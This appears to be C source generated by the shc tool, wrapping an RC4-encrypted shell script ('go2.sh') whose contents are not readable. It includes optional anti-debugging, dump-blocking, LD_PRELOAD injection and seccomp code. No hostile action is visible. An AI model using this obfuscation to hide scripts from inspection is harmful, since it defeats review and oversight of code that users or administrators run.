#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f go2.sh -o sol2 
#endif

static  char data [] = 
#define      lsto_z	1
#define      lsto	((&data[0]))
	"\266"
#define      tst1_z	22
#define      tst1	((&data[1]))
	"\315\100\273\057\066\053\170\035\373\307\151\110\331\266\333\322"
	"\254\356\054\241\112\374\112\023\203\200"
#define      tst2_z	19
#define      tst2	((&data[29]))
	"\055\305\022\367\260\121\102\274\313\044\071\050\061\371\323\256"
	"\040\145\245\145\236"
#define      chk1_z	22
#define      chk1	((&data[52]))
	"\314\157\302\006\036\143\117\234\372\047\371\247\371\073\073\160"
	"\166\134\105\250\047\153\166\232\375\206\333\245\121"
#define      xecc_z	15
#define      xecc	((&data[77]))
	"\126\013\157\211\322\363\304\062\127\124\324\230\016\231\355\035"
	"\047"
#define      chk2_z	19
#define      chk2	((&data[96]))
	"\226\370\201\322\020\160\310\127\155\221\027\357\250\252\150\151"
	"\333\004\023\170\056\126"
#define      msg2_z	19
#define      msg2	((&data[117]))
	"\350\370\116\054\225\237\146\373\140\077\136\325\337\106\333\303"
	"\220\300\025\144\302\114"
#define      rlax_z	1
#define      rlax	((&data[138]))
	"\276"
#define      date_z	1
#define      date	((&data[139]))
	"\234"
#define      opts_z	1
#define      opts	((&data[140]))
	"\321"
#define      text_z	1362
#define      text	((&data[250]))
	"\023\243\323\105\127\361\155\106\175\277\335\165\025\102\270\177"
	"\052\173\313\217\160\105\271\357\170\144\073\032\322\215\230\346"
	"\061\154\053\210\135\230\317\332\130\254\120\156\357\011\355\031"
	"\204\271\250\364\376\142\344\167\307\037\222\231\255\052\200\336"
	"\227\253\147\364\104\066\317\235\343\040\013\322\051\371\353\255"
	"\263\224\242\262\366\207\051\275\247\273\127\124\346\330\062\175"
	"\203\232\162\310\320\102\146\263\142\162\206\213\153\220\313\325"
	"\113\037\175\310\226\176\250\332\035\340\273\115\067\312\231\204"
	"\240\337\376\312\154\225\272\172\300\342\207\152\065\130\277\257"
	"\101\000\243\107\347\271\305\112\271\117\221\350\016\132\065\172"
	"\103\266\102\267\141\207\145\311\246\101\043\163\005\075\163\377"
	"\335\253\140\215\367\026\251\204\205\136\104\005\057\033\300\327"
	"\226\171\202\347\050\364\311\355\365\127\240\274\300\173\151\273"
	"\224\147\367\366\077\136\325\273\156\322\356\230\061\326\066\070"
	"\355\111\333\106\023\375\147\356\014\200\374\055\160\302\135\345"
	"\023\137\040\120\304\016\161\340\227\052\364\245\342\375\326\132"
	"\155\012\233\001\337\235\066\276\125\062\370\113\113\160\064\055"
	"\075\300\037\030\200\144\152\241\336\306\040\061\202\170\116\247"
	"\327\206\356\120\134\167\266\150\225\056\370\103\160\356\147\204"
	"\315\145\266\112\256\020\032\107\213\114\132\234\355\355\250\220"
	"\062\305\130\121\075\050\116\250\362\116\314\143\127\253\054\061"
	"\242\004\057\355\260\147\226\142\351\037\363\060\174\011\152\023"
	"\377\224\074\146\165\317\350\237\163\220\377\021\201\207\163\014"
	"\363\301\364\276\157\262\173\332\047\277\110\122\321\244\002\063"
	"\373\325\303\275\017\367\131\141\070\313\355\174\065\172\253\021"
	"\064\225\113\344\134\307\270\144\075\232\303\275\277\251\375\251"
	"\336\261\366\316\253\366\316\062\157\026\076\306\321\055\317\176"
	"\033\023\115\070\246\204\236\213\271\362\000\172\343\170\044\261"
	"\356\324\041\314\076\254\114\017\311\247\117\215\277\065\267\001"
	"\304\366\214\242\230\031\167\050\313\251\204\110\046\207\133\372"
	"\365\302\164\323\077\027\135\155\107\374\176\220\002\210\374\265"
	"\002\070\250\205\132\352\205\100\332\125\211\371\111\361\037\013"
	"\265\107\007\342\157\145\361\034\005\360\256\347\240\015\324\000"
	"\341\325\222\244\227\272\316\340\145\021\175\261\032\135\352\027"
	"\140\322\042\311\041\264\162\167\201\117\205\215\032\070\217\327"
	"\263\173\275\250\162\045\234\261\027\317\102\166\112\311\036\315"
	"\354\175\320\160\157\001\353\222\047\157\020\201\015\047\337\306"
	"\221\004\113\006\326\306\236\116\241\026\122\154\322\351\205\122"
	"\346\176\136\301\163\047\316\047\012\111\024\137\336\253\371\250"
	"\302\216\036\074\336\225\370\066\025\133\336\277\136\226\350\211"
	"\137\266\054\327\107\267\003\022\325\040\020\135\151\055\160\063"
	"\377\006\322\235\177\026\152\216\152\045\211\167\042\231\300\077"
	"\013\222\253\132\052\156\132\360\173\060\243\310\235\225\252\134"
	"\245\033\104\065\062\012\042\160\223\161\326\023\023\373\217\164"
	"\046\241\047\365\116\177\313\077\232\126\315\012\233\043\020\032"
	"\211\255\174\040\062\065\040\316\204\250\035\327\062\333\006\107"
	"\363\237\042\153\375\332\025\173\004\037\030\044\015\277\225\131"
	"\310\151\063\251\216\307\226\064\251\006\051\377\032\002\212\044"
	"\375\203\053\350\045\220\013\211\143\311\076\352\357\275\237\200"
	"\150\232\175\136\214\166\372\366\102\225\347\163\374\255\345\124"
	"\007\260\030\077\350\217\152\023\233\044\052\353\320\123\133\117"
	"\354\150\064\314\246\076\224\277\065\314\203\243\267\152\276\275"
	"\220\166\225\227\221\372\254\210\210\335\263\241\151\042\272\016"
	"\073\224\343\375\067\243\040\346\106\172\324\020\230\033\360\367"
	"\300\376\315\105\350\075\240\012\276\022\371\226\306\346\126\261"
	"\210\246\006\057\354\344\016\355\042\014\165\156\323\112\063\207"
	"\356\343\012\077\207\333\125\364\111\151\133\076\127\255\017\105"
	"\356\060\015\335\155\031\356\161\363\121\106\110\262\251\261\161"
	"\214\372\035\075\066\252\262\040\123\273\205\257\032\052\014\234"
	"\077\266\360\353\022\155\153\243\007\310\056\202\030\326\326\034"
	"\127\022\264\366\032\142\110\061\247\264\350\061\177\021\371\264"
	"\307\117\204\016\213\060\244\032\247\165\245\136\042\004\351\105"
	"\237\262\056\267\115\160\015\041\120\135\002\326\160\161\165\177"
	"\322\233\244\115\143\146\137\167\224\341\244\065\213\105\072\032"
	"\063\355\151\070\124\156\264\040\207\375\155\255\360\363\114\305"
	"\376\305\364\367\246\160\343\327\217\127\327\137\270\332\147\252"
	"\364\314\327\374\035\266\173\177\000\162\132\273\117\345\327\127"
	"\111\311\161\327\367\000\240\252\061\245\227\113\005\173\045\056"
	"\270\250\243\314\335\271\044\104\210\123\272\276\241\170\117\205"
	"\126\074\342\114\166\245\170\171\062\277\207\255\111\176\005\025"
	"\344\247\073\317\215\274\040\055\075\134\170\153\045\076\071\352"
	"\311\275\166\173\264\150\255\363\317\160\022\132\310\047\026\361"
	"\172\056\031\227\123\053\346\257\056\105\014\307\111\337\161\122"
	"\203\243\242\321\103\144\127\066\175\300\037\071\177\301\177\001"
	"\051\347\036\220\141\033\023\016\301\016\204\063\260\260\125\361"
	"\113\227\277\055\322\243\375\121\075\017\114\170\310\072\332\150"
	"\143\242\204\350\355\213\136\250\113\132\042\301\231\321\311\321"
	"\047\022\107\211\165\310\366\001\140\161\233\254\133\203\241\075"
	"\101\353\355\372\311\222\055\145\043\216\060\065\320\064\126\347"
	"\010\307\061\051\132\117\373\150\306\255\123\360\164\355\225\114"
	"\100\014\175\053\367\052\131\046\365\254\326\303\007\151\070\044"
	"\347\311\203\123\021\202\043\222\013\150\336\271\233\060\204\065"
	"\253\030\317\350\373\141\307\020\136\301\262\356\201\005\052\064"
	"\026\051\006\275\151\226\163\010\240\020\111\224\261\352\355\120"
	"\174\302\160\142\210\332\011\150\217\210\132\113\225\036\200\376"
	"\161\064\156\142\046\133\264\142\374\021\272\105\174\331\226\132"
	"\013\343\011\346\234\037\165\050\103\254\133\111\133\017\076\113"
	"\115\245\375\135\370\372\272\061\011\271\134\144\061\321\170\220"
	"\173\051\046\136\076\372\127\353\100\006\307\255\262\211\103\162"
	"\374\256\240\124\313\373\115\046\115\154\350\260\325\003\377\350"
	"\227\306\175\253\127\133\335\315\025\146\047\017\061\347\373\007"
	"\077\121\306\363\063\157\377\316\141\320\267\070\275\274\114\162"
	"\071\036\007\334\320\375\143\372\273\012\265\023\137\233\353\222"
	"\031\157\054\213\070\374\315\236\260\060\021\067\273\174\251\365"
	"\233\260\322\154\256\065\147\152\100\034\176\237\270\152\061\322"
	"\331\135\136\022\132\053\261\012\134\302\101\027\077\353\015\333"
	"\233\337\110\112\025\257\265\125\314\063\365\205\235\046\127\167"
	"\204\265\211\336\341\073\350\075\376\052\125\075\025\143\031\261"
	"\103\141\374\130\021\261\256\336\344\243\143\202\312\273\371\116"
	"\161\203\055\123\277\026\220\275\100\346\373\126\112\024\010\215"
	"\166\005\345\210\266\224\146\233\067\312\035\002\206\027\121\367"
	"\233\176\113\132\224\334\027\325\302\022\054\014\047\064\231\235"
	"\071\177\045\360\023\214"
#define      pswd_z	256
#define      pswd	((&data[1798]))
	"\251\116\334\300\237\324\133\035\037\266\262\373\315\207\276\340"
	"\264\313\007\240\111\141\313\025\124\220\053\143\204\267\362\043"
	"\227\266\023\236\151\067\162\375\035\321\163\245\203\374\054\314"
	"\276\213\155\010\355\070\035\102\311\111\246\115\001\231\161\230"
	"\120\204\066\271\273\251\267\331\172\053\176\376\047\253\312\346"
	"\067\070\356\044\161\014\147\072\126\015\210\127\246\371\357\366"
	"\176\046\260\072\317\150\023\112\223\222\110\272\075\023\240\164"
	"\113\217\231\274\233\000\366\361\015\176\111\264\170\070\253\366"
	"\136\133\060\056\304\104\170\127\326\301\021\023\324\262\210\037"
	"\102\041\333\335\041\322\317\057\121\030\343\311\121\216\300\260"
	"\352\360\336\256\065\127\006\013\030\027\037\354\312\247\014\015"
	"\310\350\353\351\272\272\031\013\323\374\325\045\213\225\325\166"
	"\206\264\044\273\013\052\307\044\102\346\021\015\215\035\032\126"
	"\005\005\100\300\300\131\314\224\125\242\271\341\070\217\127\277"
	"\103\174\172\117\246\102\163\351\050\204\367\266\242\021\015\250"
	"\027\115\151\330\247\065\154\375\330\046\336\020\265\065\317\371"
	"\261\112\110\130\214\274\102\265\100\071\154\343\113\171\214\142"
	"\307\365\072\350\145\244\042\344\312\023\370\126\236\104\255\110"
	"\223\212\011\062\136\145\120\176\033"
#define      msg1_z	65
#define      msg1	((&data[2084]))
	"\212\070\310\077\003\317\050\150\361\232\150\266\303\315\214\307"
	"\355\302\131\265\262\121\146\223\171\271\075\267\357\307\117\103"
	"\356\067\124\376\313\233\306\007\330\247\030\234\126\306\355\343"
	"\023\105\202\376\175\335\115\047\071\025\102\066\040\346\152\155"
	"\174\105\161\117\032\213\236\123\024\164\112\115\076\136\106\225"
	"\374\213\102\105\036\314\116\121"
#define      shll_z	10
#define      shll	((&data[2166]))
	"\251\316\014\313\315\101\056\202\223\225\102\017\244"
#define      inlo_z	3
#define      inlo	((&data[2177]))
	"\154\226\231"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
